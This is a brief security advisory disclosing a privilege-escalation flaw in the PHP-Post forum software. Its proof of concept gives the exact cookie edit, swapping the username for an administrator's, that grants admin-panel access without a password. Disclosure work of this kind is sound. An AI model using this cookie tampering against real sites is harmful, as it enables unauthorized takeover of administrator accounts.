About PHP-Post:
--------------------
Free, full featured php+mysql Forum Management System.

Vulnerability:
--------------------
Privilege Escalation:
PHP-Post contains a flaw that may allow a remote attacker to gain administrative privileges.
PHP-Post doesn't properly authenticate remote users if auto login is on!
By editing the values of the cookie, an attacker can change their privilege from a regular user to administrator and submit it back to the site.

Proof of Concepts:
--------------------
Cookie: logincookie[pwd]=5a329326344d1d38; logincookie[user]=3nitr0; logincookie[last]=2006-07-07+05%3A24%3A44; logincookie[lastv]=1152264284; post[329]=330

change to:

Cookie: logincookie[pwd]=5a329326344d1d38; logincookie[user]="ADMIN`S USERNAME"; logincookie[last]=2006-07-07+05%3A24%3A44; logincookie[lastv]=1152264284; post[329]=330

refresh the site, go to the admin`s panel without password ;)

Solution:
--------------------
No special patch is yet released by vendor but the vendor's website was patched!
